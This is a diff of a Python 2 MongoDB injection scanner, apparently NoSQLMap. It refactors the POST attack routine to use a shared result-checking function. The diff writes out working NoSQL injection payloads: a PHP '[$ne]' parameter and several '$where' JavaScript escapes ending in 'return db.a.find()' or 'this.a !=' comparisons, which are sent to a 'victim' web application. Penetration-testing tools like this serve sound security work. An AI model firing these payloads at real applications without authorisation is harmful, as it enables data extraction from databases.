@@ -83,7 +83,7 @@ def mainMenu():
 			#Check minimum required options
 			if (optionSet[0] == True) and (optionSet[2] == True):	
 				if httpMethod == "GET":
-					webApps()
+					getApps()
 				
 				else:
 					postApps()
@@ -193,7 +193,7 @@ def options():
 
 		elif select == "4":
 			httpMethod = True
-			while httpMethod:
+			while httpMethod == True:
 
 				print "1-Send request as a GET"
 				print "2-Send request as a POST"
@@ -503,7 +503,9 @@ def postApps():
 	print "==============="
 	paramName = []
 	paramValue = []
+	global vulnAddrs
 	vulnAddrs = []
+	global possAddrs
 	possAddrs = []
 	timeVulnsStr = []
 	timeVulnsInt = []
@@ -512,8 +514,9 @@ def postApps():
 	intTbAttack = False
 	trueStr = False
 	trueInt = False
-	lt24 = False
 	global postData
+	global neDict
+	testNum = 1
 	
 	#Verify app is working.  
 	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
@@ -603,46 +606,11 @@ def postApps():
 		else:
 			print "Test 1: PHP associative array injection"
 
-		injLen = int(len(urllib2.urlopen(req).read()))
+		injLen = int(len(urllib2.urlopen(req).read()))			
+		checkResult(randLength,injLen,testNum)
+		testNum += 1
+		print "\n"
 		
-		if verb == "ON":
-			print "Got response length of " + str(injLen) + "."
-		
-		randInjDelta = abs(injLen - randLength)
-		
-		if (randInjDelta >= 100) and (injLen != 0) :
-			if verb == "ON":
-				print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
-	
-			else:
-				print "Successful injection!"
-			
-			vulnAddrs.append(str(neDict))
-				
-		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
-			if verb == "ON":
-				print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
-			
-			else:
-				print "Possible injection."
-			
-			possAddrs.append(str(neDict))
-		
-		elif (randInjDelta == 0):
-			if verb == "ON":
-				print "Random string response size and not equals injection were the same. Injection did not work."
-			
-			else:
-				print "Injection failed."
-		else:
-			if verb == "ON":
-				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-				
-			else:
-				print "Possible injection."
-			
-			possAddrs.append(str(neDict))
-				
 		#Delete the extra key
 		del postData[injOpt + "[$ne]"]
 		postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
@@ -655,47 +623,11 @@ def postApps():
 		else:
 			print "Test 2: $where injection (string escape)"
 		
-		whereStrLen = int(len(urllib2.urlopen(req).read()))
-		whereStrDelta = abs(whereStrLen - randLength)
-		
-		if (whereStrDelta >= 100) and (whereStrLen > 0):
-			if verb == "ON":
-				print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
-			else:
-				print "Successful injection!"
-			lt24 = True
-			str24 = True
-			vulnAddrs.append(str(postData))
-			
-			
-			
-		
-		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
-			if verb == "ON":
-				print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			
-			else:
-				print "Possible injection."
-				
-			possAddrs.append(str(postData))
-			
-		elif (whereStrDelta == 0):
-			if verb == "ON":
-				print "Random string response size and $where injection were the same. Injection did not work."
-			
-			else:
-				print "Injection failed."
-		
-		else:
-			if verb == "ON":
-				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-			
-			else:
-				print "Injection failed."
-				
-			possAddrs.append(str(postData))
-		
+		injLen = int(len(urllib2.urlopen(req).read()))
+		checkResult(randLength,injLen,testNum)
+		testNum += 1
 		print "\n"
+		
 		postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
@@ -706,40 +638,12 @@ def postApps():
 			print "Test 3: $where injection (integer escape)"
 		
 		
-		whereIntLen = int(len(urllib2.urlopen(req).read()))
-		whereIntDelta = abs(whereIntLen - randLength)
-		
-		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
-			if verb == "ON":
-				print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
-			else:
-				print "Successful injection!"
-			lt24 = True
-			int24 = True
-			vulnAddrs.append(str(postData))
-			
-		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
-			if verb == "ON":
-				print "Response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			else:
-				print "Possible injection. "
-			possAddrs.append(str(postData))
-			
-		elif (whereIntDelta == 0):
-			if verb == "ON":
-				print "Random string response size and $where injection were the same. Injection did not work."
-			else:
-				print "Injection failed."
-		
-		else:
-			if verb == "ON":
-				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-			else:
-				print "Possible injection."
-			possAddrs.append(str(postData))
-			
+		injLen = int(len(urllib2.urlopen(req).read()))
+		checkResult(randLength,injLen,testNum)
+		testNum += 1
+		print "\n"
+
 		#Start a single record attack in case the app expects only one record back
-		
 		postData.update({injOpt:"a'; return db.a.findOne(); var dummy='!"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
@@ -750,39 +654,11 @@ def postApps():
 		else:
 			print "Test 4: $where injection string escape (single record)"
 		
-		whereOneStrLen = int(len(urllib2.urlopen(req).read()))
-		whereOneStrDelta = abs(whereOneStrLen - randLength)
-			
-		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
-			if verb == "ON":
-				print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
-			else:
-				print "Successful injection!"
-			lt24 = True
-			str24 = True
-			vulnAddrs.append(str(postData))
-		
-		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
-			if verb == "ON":
-				print "response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			else:
-				print "Possible injection."
-			possAddrs.append(str(postData))
-			
-		elif (whereOneStrDelta == 0):
-			if verb == "ON":
-				print "Random string response size and $where single injection were the same. Injection did not work."
-			else:
-				print "Injection failed."
-		
-		else:
-			if verb == "ON":
-				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-			else:
-				print "Possible injection."
-			possAddrs.append(str(postData))
-			
+		injLen = int(len(urllib2.urlopen(req).read()))
+		checkResult(randLength,injLen,testNum)
+		testNum += 1
 		print "\n"
+		
 		postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
@@ -794,42 +670,11 @@ def postApps():
 			print "Test 5: $where injection integer escape (single record)"
 		
 		
-		whereOneIntLen = int(len(urllib2.urlopen(req).read()))
-		whereOneIntDelta = abs(whereOneIntLen - randLength)				
-			
-		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
-			if verb == "ON":
-				print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
-			
-			else:
-				print "Successful Injection!"
-			lt24 = True
-			int24 = True
-			vulnAddrs.append(str(postData))
-		
-		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
-			if verb == "ON":
-				print "response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			
-			else:
-				print "Possible injection."
-			possAddrs.append(postData)
-			
-		elif (whereOneIntDelta == 0):
-			if verb == "ON":
-				print "Random string response size and $where single record injection were the same. Injection did not work."
-			
-			else:
-				print "Injection failed."
-			
-		else:	
-			if verb == "ON":
-				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-			else:
-				print "Possible injection."
-			possAddrs.append(str(postData))
-			
+		injLen = int(len(urllib2.urlopen(req).read()))
+		checkResult(randLength,injLen,testNum)
+		testNum += 1
 		print "\n"
+		
 		postData.update({injOpt:"a'; return this.a != '" + injectString + "'; var dummy='!"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
@@ -841,77 +686,26 @@ def postApps():
 		else:
 			print "Test 6: This != injection (string escape)"
 		
-		whereThisStrLen = int(len(urllib2.urlopen(req).read()))
-		whereThisStrDelta = abs(whereThisStrLen - randLength)
-		
-		if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
-			if verb == "ON":
-				print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
-			else:
-				print "Injection successful!"
-			vulnAddrs.append(str(postData))
-		
-		elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
-			if verb == "ON":
-				print "Response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			else:
-				print "Possible injection."
-			possAddrs.append(str(postData))
-			
-		elif (whereThisStrDelta == 0):
-			if verb == "ON":
-				print "Random string response size and this return response size were the same. Injection did not work."
-			else:
-				print "Injection failed."
-			
-		else:	
-			if verb == "ON":
-				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-			else:
-				print "Possible injection."
-			possAddrs.append(str(postData))
-			
+		injLen = int(len(urllib2.urlopen(req).read()))
+		checkResult(randLength,injLen,testNum)
+		testNum += 1
 		print "\n"
+		
 		postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
+		
 		if verb == "ON":
 			print "Testing Mongo this not equals integer escape attack for all records..."
 			print " Injecting " + str(postData)
 		else:
 			print "Test 7:  This != injection (integer escape)"
 		
-		whereThisIntLen = int(len(urllib2.urlopen(req).read()))
-		whereThisIntDelta = abs(whereThisIntLen - randLength)
-		
-		if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
-			if verb == "ON":
-				print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
-			else:
-				print "Injection successful!"
-			vulnAddrs.append(str(postData))
-		
-		elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
-			if verb == "ON":
-				print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
-			else:
-				print "Possible injection."
-			possAddrs.append(str(postData))
-			
-		elif (whereThisIntDelta == 0):
-			if verb == "ON":
-				print "Random string response size and this return response size were the same. Injection did not work."
-			else:
-				print "Injection failed."
-			
-		else:	
-			if verb == "ON":
-				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
-			else:
-				print "Possible injection."
-			possAddrs.append(str(postData))
-			
+		injLen = int(len(urllib2.urlopen(req).read()))
+		checkResult(randLength,injLen,testNum)
+		testNum += 1
 		print "\n"
+		
 		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
 		
 		if doTimeAttack == "y" or doTimeAttack == "Y":
@@ -979,10 +773,10 @@ def postApps():
 		if fileOut == "y" or fileOut == "Y":
 			savePath = raw_input("Enter output file name: ")
 			fo = open(savePath, "wb")
-			fo.write ("Vulnerable URLs:\n")
+			fo.write ("Vulnerable Requests:\n")
 			fo.write("\n".join(vulnAddrs))
 			fo.write("\n\n")
-			fo.write("Possibly Vulnerable URLs:\n")
+			fo.write("Possibly Vulnerable Requests:\n")
 			fo.write("\n".join(possAddrs))
 			fo.write("\n")
 			fo.write("Timing based attacks:\n")
@@ -1003,7 +797,7 @@ def postApps():
 	raw_input("Press enter to continue...")
 	return()	
 	
-def webApps():
+def getApps():
 	print "Web App Attacks (GET)"
 	print "==============="
 	paramName = []
@@ -1088,10 +882,7 @@ def webApps():
 			print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
 		else:
 			print "Test 1: PHP associative array injection"
-		injLen = int(len(urllib.urlopen(uriArray[1]).read()))
-	
-		if verb == "ON":
-			print "Got response length of " + str(injLen) + "."	
+		injLen = int(len(urllib.urlopen(uriArray[1]).read()))	
 		checkResult(randLength,injLen,testNum)
 		testNum += 1
 		print "\n"
@@ -1261,6 +1052,9 @@ def checkResult(baseSize,respSize,testNum):
 	global lt24
 	global str24
 	global int24
+	global httpMethod
+	global neDict
+	global postData
 	
 	delta = abs(respSize - baseSize)
 	if (delta >= 100) and (respSize != 0) :
@@ -1269,8 +1063,14 @@ def checkResult(baseSize,respSize,testNum):
 		else:
 			print "Successful injection!"
 		
+		if httpMethod == "GET":
+			vulnAddrs.append(uriArray[testNum])
+		else:
+			if testNum == 1:
+				vulnAddrs.append(str(neDict))
+			else:
+				vulnAddrs.append(str(postData))
 			
-		vulnAddrs.append(uriArray[testNum])
 		if testNum == 2 or testNum == 4:
 			lt24 = True
 			str24 = True
@@ -1285,7 +1085,14 @@ def checkResult(baseSize,respSize,testNum):
 			print "Response variance was only " + str(delta) + " bytes. Injection might have worked but difference is too small to be certain. "
 		else:
 			print "Possible injection."
-		possAddrs.append(uriArray[testNum])
+		
+		if httpMethod == "GET":
+			possAddrs.append(uriArray[testNum])
+		else:
+			if testNum == 1:
+				possAddrs.append(str(neDict))
+			else:
+				possAddrs.append(str(postData))
 		return
 		
 	elif (delta == 0):
@@ -1299,7 +1106,13 @@ def checkResult(baseSize,respSize,testNum):
 			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
 		else:
 			print "Possible injection."
-		possAddrs.appends(uriArray[testNum])
+		if httpMethod == "GET":
+			possAddrs.appends(uriArray[testNum])
+		else:
+			if testNum == 1:
+				possAddrs.append(str(neDict))
+			else:
+				possAddrs.append(str(postData))
 		return
 	
 def randInjString(size):
